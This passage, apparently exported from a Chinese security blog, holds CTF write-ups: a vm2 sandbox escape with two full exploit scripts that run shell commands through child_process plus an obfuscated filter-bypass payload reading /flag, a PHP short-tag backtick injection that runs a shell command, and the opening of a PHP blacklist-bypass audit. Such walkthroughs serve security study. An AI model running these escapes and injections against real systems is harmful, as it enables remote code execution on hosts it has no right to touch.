class="line">    $code = $_GET[&#x27;code&#x27;];</span><br><span class="line">    echo eval(code);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此时，我们直接构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure><p>发现有过滤，然后再仔细查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">真的是php嘛</span><br></pre></td></tr></table></figure><p>这句话，我们可以推测可能是其它，而nodejs也有eval()函数，所以使用Error().stack测试，发现报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error at vm.js:1:1 at Script.runInContext (vm.js:131:20) at VM.run (/app/node_modules/vm2/lib/main.js:219:62) at /app/server.js:51:33 at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at next (/app/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at /app/node_modules/express/lib/router/index.js:281:22 at Function.process_params (/app/node_modules/express/lib/router/index.js:335:12)</span><br></pre></td></tr></table></figure><p>从报错中的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error at vm.js:1:1</span><br></pre></td></tr></table></figure><p>我们可以猜测可能是vm2沙箱逃逸，所以我们可以利用vm2沙箱逃逸来执行恶意代码，所以我们可以使用以下exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">const &#123;VM&#125; = require(&#x27;vm2&#x27;);</span><br><span class="line">const untrusted = &#x27;(&#x27; + function()&#123;</span><br><span class="line">TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();</span><br><span class="line">try&#123;</span><br><span class="line">Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;</span><br><span class="line">&#125;catch(e)&#123;</span><br><span class="line">return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();</span><br><span class="line">&#125;</span><br><span class="line">&#125;+&#x27;)()&#x27;;</span><br><span class="line">try&#123;</span><br><span class="line">console.log(new VM().run(untrusted));</span><br><span class="line">&#125;catch(x)&#123;</span><br><span class="line">console.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者使用以下exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">const &#123;VM&#125; = require(&#x27;vm2&#x27;);</span><br><span class="line">const untrusted = &#x27;(&#x27; + function()&#123;</span><br><span class="line">try&#123;</span><br><span class="line">Buffer.from(new Proxy(&#123;&#125;, &#123;</span><br><span class="line">getOwnPropertyDescriptor()&#123;</span><br><span class="line">throw f=&gt;f.constructor(&quot;return process&quot;)();</span><br><span class="line">&#125;</span><br><span class="line">&#125;));</span><br><span class="line">&#125;catch(e)&#123;</span><br><span class="line">return e(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();</span><br><span class="line">&#125;</span><br><span class="line">&#125;+&#x27;)()&#x27;;</span><br><span class="line">try&#123;</span><br><span class="line">console.log(new VM().run(untrusted));</span><br><span class="line">&#125;catch(x)&#123;</span><br><span class="line">console.log(x);</span><br><span class="line">&#125;</span><br><span class="line">```           </span><br><span class="line"></span><br><span class="line">其实简单的说就是利用()=&gt;&#123;&#125;这个函数被包装成代理对像，而这个代理对象中的get方法的constructor属性的返回值为host.function，所以利用其来使用内置类来执行恶意代码</span><br><span class="line"></span><br><span class="line">但是这里有对特殊字母有过滤</span><br></pre></td></tr></table></figure><p>for, while, process, exec, eval, constructor, prototype, Function</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">所以我们可以利用在关键字母上加反引号`来绕过</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者使用$&#123;$&#123;prototyp&#125;e&#125;来绕过，即</span><br></pre></td></tr></table></figure><p>/run.php?code=(function (){<br>    TypeError[<code>$&#123;</code>${<code>prototyp</code>}e<code>&#125;</code>][<code>$&#123;</code>${<code>get_proces</code>}s<code>&#125;</code>] = f=&gt;f[<code>$&#123;</code>${<code>constructo</code>}r<code>&#125;</code>](<code>$&#123;</code>${<code>return this.proces</code>}s<code>&#125;</code>)();<br>    try{<br>        Object.preventExtensions(Buffer.from(``)).a = 1;<br>    }catch(e){<br>        return e<a href="()=%3E%7B%7D"><code>$&#123;</code>${<code>get_proces</code>}s<code>&#125;</code></a>.mainModule<a href="%60$%7B%60$%7B%60child_proces%60%7Ds%60%7D%60"><code>$&#123;</code>${<code>requir</code>}e<code>&#125;</code></a>[<code>$&#123;</code>${<code>exe</code>}cSync<code>&#125;</code>](<code>cat /flag</code>).toString();<br>    }<br>})()</p><p>```<br>即可得到flag</p><p>参考文章：[<a href="https://www.anquanke.com/post/id/207291]">https://www.anquanke.com/post/id/207291]</a></p><pre><code>[https://www.anquanke.com/post/id/207283][https://es6.ruanyifeng.com/?search=weakmap&amp;x=0&amp;y=0#docs/proxy][https://github.com/patriksimek/vm2/issues/225]    [https://www.freesion.com/article/92951402280/]                                            </code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vm2沙箱逃逸&quot;&gt;&lt;a href=&quot;#vm2沙箱逃逸&quot; class=&quot;headerlink&quot; title=&quot;vm2沙箱逃逸&quot;&gt;&lt;/a&gt;vm2沙箱逃逸&lt;/h1&gt;&lt;h2 id=&quot;vm2-API&quot;&gt;&lt;a href=&quot;#vm2-API&quot; class=&quot;headerlink</summary>
      
    
    
    
    
    <category term="nodejs" scheme="http://example.com/tags/nodejs/"/>
    
  </entry>
  
  <entry>
    <title>反引号的使用以及php短标签</title>
    <link href="http://example.com/2021/10/11/%E5%8F%8D%E5%BC%95%E5%8F%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8Aphp%E7%9F%AD%E6%A0%87%E7%AD%BE/"/>
    <id>http://example.com/2021/10/11/%E5%8F%8D%E5%BC%95%E5%8F%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8Aphp%E7%9F%AD%E6%A0%87%E7%AD%BE/</id>
    <published>2021-10-10T16:00:00.000Z</published>
    <updated>2021-10-11T08:20:28.704Z</updated>
    
    <content type="html"><![CDATA[<h1 id="反引号的使用以及php短标签"><a href="#反引号的使用以及php短标签" class="headerlink" title="反引号的使用以及php短标签"></a>反引号的使用以及php短标签</h1><p>打开页面，发现是源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">function check($input)&#123;</span><br><span class="line">    if(preg_match(&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;,$input))&#123;</span><br><span class="line">        // if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span><br><span class="line">        die(&#x27;hacker!!!&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function waf($input)&#123;</span><br><span class="line">  if(is_array($input))&#123;</span><br><span class="line">      foreach($input as $key=&gt;$output)&#123;</span><br><span class="line">          $input[$key] = waf($output);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">      $input = check($input);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = &#x27;sandbox/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;/&#x27;;</span><br><span class="line">if(!file_exists($dir))&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123;</span><br><span class="line">    case &#x27;pwd&#x27;:</span><br><span class="line">        echo $dir;</span><br><span class="line">        break;</span><br><span class="line">    case &#x27;upload&#x27;:</span><br><span class="line">        $data = $_GET[&quot;data&quot;] ?? &quot;&quot;;</span><br><span class="line">        waf($data);</span><br><span class="line">        file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>我们可以看见源码中有两个自定义函数waf()和check()函数</p><p>对于第一个waf()函数，我们可以知道</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function waf($input)&#123;</span><br><span class="line">  if(is_array($input))&#123;</span><br><span class="line">      foreach($input as $key=&gt;$output)&#123;</span><br><span class="line">          $input[$key] = waf($output);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">      $input = check($input);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当输入的值为数组时会进入一个死循环，而当输入的值部位数组时，会进入check()函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function check($input)&#123;</span><br><span class="line">    if(preg_match(&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;,$input))&#123;</span><br><span class="line">        // if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span><br><span class="line">        die(&#x27;hacker!!!&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见正则过滤了空格、下划线、^、+、eval、{、}，且由于是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ /i</span><br></pre></td></tr></table></figure><p>所以是不区分大小写，而对于主体代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$dir = &#x27;sandbox/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;/&#x27;;</span><br><span class="line">if(!file_exists($dir))&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123;</span><br><span class="line">    case &#x27;pwd&#x27;:</span><br><span class="line">        echo $dir;</span><br><span class="line">        break;</span><br><span class="line">    case &#x27;upload&#x27;:</span><br><span class="line">        $data = $_GET[&quot;data&quot;] ?? &quot;&quot;;</span><br><span class="line">        waf($data);</span><br><span class="line">        file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可知，当?action=pwd时，会回显路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sandbox/f2f0c289641ba52db7d0edeb85513ada/</span><br></pre></td></tr></table></figure><p>而我们?action=upload时，会将$data的内容写入到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sandbox/f2f0c289641ba52db7d0edeb85513ada/index.php</span><br></pre></td></tr></table></figure><p>所以我们可以利用这个一点来构造恶意代码，但是它过滤了php，所以我们可以使用php的短标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= ?&gt;相当于&lt;?echo ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;? ?&gt;</span><br></pre></td></tr></table></figure><p>而php有一个特性，就是当php代码中有反引号闭合的，就会将反引号闭合的当作是shell命令执行，相当于shell_exec()，所以当禁用shell_exec()时失效</p><p>因此可以构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=&lt;?`cat%09*`?&gt;</span><br></pre></td></tr></table></figure><p>其中%09是绕过空格过滤的，这样即可读出flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;反引号的使用以及php短标签&quot;&gt;&lt;a href=&quot;#反引号的使用以及php短标签&quot; class=&quot;headerlink&quot; title=&quot;反引号的使用以及php短标签&quot;&gt;&lt;/a&gt;反引号的使用以及php短标签&lt;/h1&gt;&lt;p&gt;打开页面，发现是源码&lt;/p&gt;
&lt;figure</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>$_SERVER[&#39;QUERY_STRING&#39;]绕过以及 y1ngzuishuai 的正则匹配绕过以及$_REQUEST 的字母匹配绕过以及sha1()函数绕过以及create_function () 代码注入</title>
    <link href="http://example.com/2021/10/10/$_SERVER[&#39;QUERY_STRING&#39;]%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8A%20y1ngzuishuai%20%E7%9A%84%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8A$_REQUEST%20%E7%9A%84%E5%AD%97%E6%AF%8D%E5%8C%B9%E9%85%8D%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8Asha1()%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8Acreate_function%20()%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2021/10/10/$_SERVER[&#39;QUERY_STRING&#39;]%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8A%20y1ngzuishuai%20%E7%9A%84%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8A$_REQUEST%20%E7%9A%84%E5%AD%97%E6%AF%8D%E5%8C%B9%E9%85%8D%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8Asha1()%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8Acreate_function%20()%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/</id>
    <published>2021-10-09T16:00:00.000Z</published>
    <updated>2021-10-11T04:33:16.750Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SERVER-‘QUERY-STRING’-绕过以及-y1ngzuishuai-的正则匹配绕过以及-REQUEST-的字母匹配绕过以及sha1-函数绕过以及create-function-代码注入"><a href="#SERVER-‘QUERY-STRING’-绕过以及-y1ngzuishuai-的正则匹配绕过以及-REQUEST-的字母匹配绕过以及sha1-函数绕过以及create-function-代码注入" class="headerlink" title="$_SERVER[‘QUERY_STRING’]绕过以及 y1ngzuishuai 的正则匹配绕过以及$_REQUEST 的字母匹配绕过以及sha1()函数绕过以及create_function () 代码注入"></a>$_SERVER[‘QUERY_STRING’]绕过以及 y1ngzuishuai 的正则匹配绕过以及$_REQUEST 的字母匹配绕过以及sha1()函数绕过以及create_function () 代码注入</h1><p>打开页面，发现是源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line">$file = &quot;1nD3x.php&quot;;</span><br><span class="line">$shana = $_GET[&#x27;shana&#x27;];</span><br><span class="line">$passwd = $_GET[&#x27;passwd&#x27;];</span><br><span class="line">$arg = &#x27;&#x27;;</span><br><span class="line">$code = &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if($_SERVER) &#123; </span><br><span class="line">    if (</span><br><span class="line">        preg_match(&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;])</span><br><span class="line">        )  </span><br><span class="line">        die(&#x27;You seem to want to do something bad?&#x27;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!preg_match(&#x27;/http|https/i&#x27;, $_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    if (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;) &#123; </span><br><span class="line">        $file = $_GET[&quot;file&quot;]; </span><br><span class="line">        echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; else die(&#x27;fxck you! What do you want to do ?!&#x27;);</span><br><span class="line"></span><br><span class="line">if($_REQUEST) &#123; </span><br><span class="line">    foreach($_REQUEST as $value) &#123; </span><br><span class="line">        if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))  </span><br><span class="line">            die(&#x27;fxck you! I hate English!&#x27;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;)</span><br><span class="line">    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[&quot;flag&quot;]);</span><br><span class="line">    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    die(&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $code) || </span><br><span class="line">preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;, $arg) ) &#123; </span><br><span class="line">    die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;); </span><br><span class="line">&#125; else &#123; </span><br><span class="line">    include &quot;flag.php&quot;;</span><br><span class="line">    $code(&#x27;&#x27;, $arg); </span><br><span class="line">&#125; ?&gt;</span><br><span class="line">This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</span><br><span class="line">fxck you! I hate English!</span><br></pre></td></tr></table></figure><p>通过对代码的审计，我们可以利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">$code(&#x27;&#x27;, $arg); </span><br></pre></td></tr></table></figure><p>来构造函数，执行恶意代码，但是我们需要绕过6个if</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> if (preg_match(&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> if (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foreach($_REQUEST as $value) &#123; </span><br><span class="line">if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))</span><br><span class="line"></span><br><span class="line">if (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;)</span><br><span class="line"></span><br><span class="line">if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )</span><br><span class="line"></span><br><span class="line">if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $code) || </span><br><span class="line">preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;, $arg) )</span><br></pre></td></tr></table></figure><h3 id="对于第一个if，我们可以看向-SERVER-‘QUERY-STRING’-，作用是获取查询语句，即获取-后面的值，而-SERVER-还有其它的参数的值，作用各不相同"><a href="#对于第一个if，我们可以看向-SERVER-‘QUERY-STRING’-，作用是获取查询语句，即获取-后面的值，而-SERVER-还有其它的参数的值，作用各不相同" class="headerlink" title="对于第一个if，我们可以看向$_SERVER[‘QUERY_STRING’]，作用是获取查询语句，即获取?后面的值，而$_SERVER[]还有其它的参数的值，作用各不相同"></a>对于第一个if，我们可以看向$_SERVER[‘QUERY_STRING’]，作用是获取查询语句，即获取?后面的值，而$_SERVER[]还有其它的参数的值，作用各不相同</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&quot;REQUEST_URI&quot;]：获取http://localhost后面的值，包括/</span><br><span class="line"></span><br><span class="line">$_SERVER[&quot;SCRIPT_NAME&quot;]：获取当前脚本的路径</span><br><span class="line"></span><br><span class="line">$_SERVER[&quot;PHP_SELF&quot;]：获取当前正在执行脚本的文件名</span><br></pre></td></tr></table></figure><h4 id="SERVER-使用的实例"><a href="#SERVER-使用的实例" class="headerlink" title="$_SERVER[]使用的实例"></a>$_SERVER[]使用的实例</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1，http://localhost/aaa/ (打开aaa中的index.php)</span><br><span class="line">结果：</span><br><span class="line">$_SERVER[&#x27;QUERY_STRING&#x27;] = &quot;&quot;;</span><br><span class="line">$_SERVER[&#x27;REQUEST_URI&#x27;] = &quot;/aaa/&quot;;</span><br><span class="line">$_SERVER[&#x27;SCRIPT_NAME&#x27;] = &quot;/aaa/index.php&quot;;</span><br><span class="line">$_SERVER[&#x27;PHP_SELF&#x27;] = &quot;/aaa/index.php&quot;;</span><br><span class="line"></span><br><span class="line">2，http://localhost/aaa/?p=222 (附带查询)</span><br><span class="line">结果：</span><br><span class="line">$_SERVER[&#x27;QUERY_STRING&#x27;] = &quot;p=222&quot;;</span><br><span class="line">$_SERVER[&#x27;REQUEST_URI&#x27;] = &quot;/aaa/?p=222&quot;;</span><br><span class="line">$_SERVER[&#x27;SCRIPT_NAME&#x27;] = &quot;/aaa/index.php&quot;;</span><br><span class="line">$_SERVER[&#x27;PHP_SELF&#x27;] = &quot;/aaa/index.php&quot;;</span><br><span class="line"></span><br><span class="line">3，http://localhost/aaa/index.php?p=222&amp;q=333</span><br><span class="line">结果：</span><br><span class="line">$_SERVER[&#x27;QUERY_STRING&#x27;] = &quot;p=222&amp;q=333&quot;;</span><br><span class="line">$_SERVER[&#x27;REQUEST_URI&#x27;] = &quot;/aaa/index.php?p=222&amp;q=333&quot;;</span><br><span class="line">$_SERVER[&#x27;SCRIPT_NAME&#x27;] = &quot;/aaa/index.php&quot;;</span><br><span class="line">$_SERVER[&#x27;PHP_SELF&#x27;] = &quot;/aaa/index.php&quot;;</span><br></pre></td></tr></table></figure><p>而$_SERVER[‘QUERY_STRING’]有个特性，就是不会进行URLDecode，而$_GET[]会，所以可以通过url编码绕过第一个if</p><h2 id="对于第二个if"><a href="#对于第二个if" class="headerlink" title="对于第二个if"></a>对于第二个if</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== 